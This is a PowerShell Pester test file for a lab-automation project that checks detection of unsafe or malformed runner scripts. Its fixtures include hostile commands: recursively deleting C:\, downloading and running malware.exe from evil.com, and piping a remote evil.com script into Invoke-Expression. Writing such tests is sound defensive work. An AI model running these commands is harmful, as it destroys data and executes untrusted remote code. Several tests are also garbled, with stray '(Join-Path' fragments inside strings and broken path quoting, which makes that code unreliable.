#!/usr/bin/env pwsh
# /workspaces/opentofu-lab-automation/tests/BadRunnerScripts.Tests.ps1

<#
.SYNOPSIS
Tests for handling bad runner scripts and user input validation

.DESCRIPTION
This test suite creates various scenarios of badly written or malformed runner scripts
to ensure the system handles them gracefully without breaking the automation or
causing security issues.
#>

. (Join-Path $PSScriptRoot "helpers" "TestHelpers.ps1")

Describe "Bad Runner Scripts Handling" {
    
    BeforeAll {
        # Set up test environment
        $TestRunnerScriptsDir = "$TestDrive/runner_scripts"
        New-Item -ItemType Directory -Path $TestRunnerScriptsDir -Force | Out-Null
        
        # Source TestHelpers for mock functions
        . "$PSScriptRoot/helpers/TestHelpers.ps1"
    }
      Context "Invalid Script Names" {
        It "should reject scripts with spaces in filename" {
            $badScript = "$TestRunnerScriptsDir/bad script name.ps1"
            "Write-Host 'Hello'" | Out-File $badScript -Encoding UTF8
            
            # Test validation function (to be created)
            { Test-RunnerScriptName $badScript } | Should -Throw "*Invalid script name*"
        }
        
        It "should reject scripts without .ps1 extension" {
            $badScript = "$TestRunnerScriptsDir/badscript.txt"
            "Write-Host 'Hello'" | Out-File $badScript -Encoding UTF8
            
            { Test-RunnerScriptName $badScript } | Should -Throw "*Invalid file extension*"
        }
        
        It "should reject scripts with special characters" {
            $badScript = "$TestRunnerScriptsDir/bad@script#.ps1"
            "Write-Host 'Hello'" | Out-File $badScript -Encoding UTF8
            
            { Test-RunnerScriptName $badScript } | Should -Throw "*Invalid characters*"
        }
        
        It "should reject scripts without sequence numbers" {
            $badScript = "$TestRunnerScriptsDir/Install-Something.ps1"
            "Write-Host 'Hello'" | Out-File $badScript -Encoding UTF8
            
            { Test-RunnerScriptName $badScript } | Should -Throw "*Missing sequence number*"
        }
    }
    
    Context "Malicious Script Content" {
        It "should detect and block scripts with dangerous commands" {
            $maliciousScript = @"
# This script tries to do dangerous things
Remove-Item C:\ -Recurse -Force
Invoke-WebRequest "http://evil.com/malware.exe" -OutFile "malware.exe"
Start-Process "malware.exe"
"@
            $scriptPath = "$TestRunnerScriptsDir/0999_MaliciousScript.ps1"
            $maliciousScript | Out-File $scriptPath -Encoding UTF8
            
            { Test-RunnerScriptSafety $scriptPath } | Should -Throw "*Potentially dangerous*"
        }
        
        It "should detect scripts with hardcoded credentials" {
            $credentialScript = @"
# Script with hardcoded credentials
`$password = "SuperSecret123!"
`$apiKey = "ak_live_1234567890abcdef"
`$connectionString = "Server=prod;User=admin;Password=admin123;"
"@
            $scriptPath = "$TestRunnerScriptsDir/0998_CredentialScript.ps1"
            $credentialScript | Out-File $scriptPath -Encoding UTF8
            
            { Test-RunnerScriptSafety $scriptPath } | Should -Throw "*Hardcoded credentials*"
        }
        
        It "should detect scripts with network access to suspicious domains" {
            $suspiciousScript = @"
# Script accessing suspicious domains
Invoke-WebRequest "http://malware-download.com/tool.exe"
curl "https://bitcoin-miner.example.com/start"
"@
            $scriptPath = "$TestRunnerScriptsDir/0997_SuspiciousScript.ps1"
            $suspiciousScript | Out-File $scriptPath -Encoding UTF8
            
            { Test-RunnerScriptSafety $scriptPath } | Should -Throw "*Suspicious network access*"
        }
    }
    
    Context "Syntax Errors and Malformed Scripts" {
        It "should handle scripts with syntax errors gracefully" {
            $syntaxErrorScript = @"
# Script with syntax errors
if (`$true {
    Write-Host "Missing closing brace"
    for (`$i = 0; `$i -lt 10 `$i++) {
        Write-Host "Missing semicolon in for loop"
    }
"@
            $scriptPath = "$TestRunnerScriptsDir/0996_SyntaxError.ps1"
            $syntaxErrorScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Test-RunnerScriptSyntax $scriptPath
            $result.HasErrors | Should -Be $true
            $result.CanAutoFix | Should -Be $true  # Our CodeFixer should handle this
        }
        
        It "should handle scripts with encoding issues" {
            $scriptPath = "$TestRunnerScriptsDir/0995_EncodingIssue.ps1"
            # Create file with invalid UTF-8 encoding
            [System.IO.File]::WriteAllBytes($scriptPath, [byte[]]@(0xFF, 0xFE, 0x57, 0x00, 0x72, 0x00))
            
            { Test-RunnerScriptEncoding $scriptPath } | Should -Throw "*Invalid encoding*"
        }
        
        It "should handle extremely large scripts" {
            $largeScript = "# Large script`n" + ("Write-Host 'Line $i(Join-Path (Join-Path (Join-Path '`n" * 100000)
            $scriptPath = "$TestRunnerScriptsDir' '0994_LargeScript.ps1"
            $largeScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Test-RunnerScriptSize $scriptPath
            $result.SizeWarning | Should -Be $true
            $result.RecommendSplit | Should -Be $true
        }
    }
    
    Context "Parameter and Configuration Issues" {        It "should handle scripts with invalid parameter blocks" {
            $invalidParamScript = @"
# Script with invalid parameters
Param(
    [Parameter(Mandatory=`$true,InvalidProperty=`$true)]
    [string]`$NonExistentValidation,
    
    [ValidateSet("Invalid","Set","Values")]
    [int]`$WrongTypeWithValidateSet
)
Write-Host "Script with bad parameters"
"@
            $scriptPath = "$TestRunnerScriptsDir/0993_InvalidParams.ps1"
            $invalidParamScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Test-RunnerScriptParameters $scriptPath
            $result.HasIssues | Should -Be $true
            $result.CanAutoFix | Should -Be $true
        }
        
        It "should handle scripts without proper configuration support" {
            $noConfigScript = @"
# Script that doesn')t use configuration properly
Write-Host "I don(Join-Path (Join-Path 't use any configuration"
Remove-Item "C:\SomeRandomPath" -Force
"@
            $scriptPath = "$TestRunnerScriptsDir' '0992_NoConfig.ps1"
            $noConfigScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Test-RunnerScriptConfiguration $scriptPath
            $result.UsesConfiguration | Should -Be $false
            $result.NeedsConfigSupport | Should -Be $true
        }
    }
    
    Context "Auto-Fix Capabilities" {
        It "should auto-fix common syntax errors" {
            $fixableScript = @"
# Script with fixable issues
if (`$true {
    Write-Host ')Missing closing brace(Join-Path (Join-Path (Join-Path (Join-Path '
}
`$var = Get-Date  # Missing semicolon before comment
Write-Host "Hello"
"@
            $scriptPath = "$TestRunnerScriptsDir' '0991_FixableScript.ps1"
            $fixableScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Invoke-RunnerScriptAutoFix $scriptPath
            $result.FixesApplied | Should -BeGreaterThan 0
            $result.NewSyntaxValid | Should -Be $true
        }
        
        It "should add missing parameter blocks" {
            $noParamScript = @"
# Script without parameter block
Write-Host "Installing something..."
"@
            $scriptPath = "$TestRunnerScriptsDir') '0990_NoParams.ps1"
            $noParamScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Invoke-RunnerScriptAutoFix $scriptPath
            $newContent = Get-Content $scriptPath -Raw
            $newContent | Should -Match "Param\("
            $newContent | Should -Match "\[object\]\`$Config"
        }
        
        It "should add missing error handling" {
            $noErrorHandlingScript = @"
# Script without error handling
Write-Host "Starting process..."
Start-Process "nonexistent.exe"
Write-Host "Process completed"
"@
            $scriptPath = "$TestRunnerScriptsDir') '0989_NoErrorHandling.ps1"
            $noErrorHandlingScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Invoke-RunnerScriptAutoFix $scriptPath
            $newContent = Get-Content $scriptPath -Raw
            $newContent | Should -Match "try\s*\{"
            $newContent | Should -Match "catch\s*\{"
        }
    }
    
    Context "Integration with CodeFixer" {
        It "should use CodeFixer to validate and fix scripts" {
            $messyScript = @"
# Messy script that needs CodeFixer
Write-Host(')Bad formatting')
`$var=Get-Date;Write-Host "No spaces"
if(`$true){Write-Host("Nested bad formatting")}
"@
            $scriptPath = "$TestRunnerScriptsDir/0988_MessyScript.ps1"
            $messyScript | Out-File $scriptPath -Encoding UTF8
            
            # This should integrate with our CodeFixer module
            $result = Invoke-CodeFixerOnRunnerScript $scriptPath
            $result.LintIssuesFound | Should -BeGreaterThan 0
            $result.AutoFixesApplied | Should -BeGreaterThan 0
        }
    }
    
    Context "Security and Validation Pipeline" {
        It "should prevent deployment of invalid scripts" {
            $invalidScript = @"
# Invalid script that should not be deployed
Remove-Item "Important-File.txt" -Force
Invoke-Expression (Invoke-WebRequest "http://evil.com/script.ps1").Content
"@
            $scriptPath = "$TestRunnerScriptsDir/0987_InvalidScript.ps1"
            $invalidScript | Out-File $scriptPath -Encoding UTF8
            
            { Invoke-RunnerScriptDeploymentValidation $scriptPath } | Should -Throw "*Failed security validation*"
        }
        
        It "should require approval for scripts with external dependencies" {
            $externalDepScript = @"
# Script with external dependencies
Install-Module SomeUnknownModule -Force
Invoke-WebRequest "https://unknown-source.com/tool.exe"
"@
            $scriptPath = "$TestRunnerScriptsDir/0986_ExternalDeps.ps1"
            $externalDepScript | Out-File $scriptPath -Encoding UTF8
            
            $result = Test-RunnerScriptDeployment $scriptPath
            $result.RequiresApproval | Should -Be $true
            $result.Reason | Should -Match "*External dependencies*"
        }
    }
    
    AfterAll {
        # Clean up test artifacts
        if (Test-Path $TestRunnerScriptsDir) {
            Remove-Item $TestRunnerScriptsDir -Recurse -Force
        }
    }
}
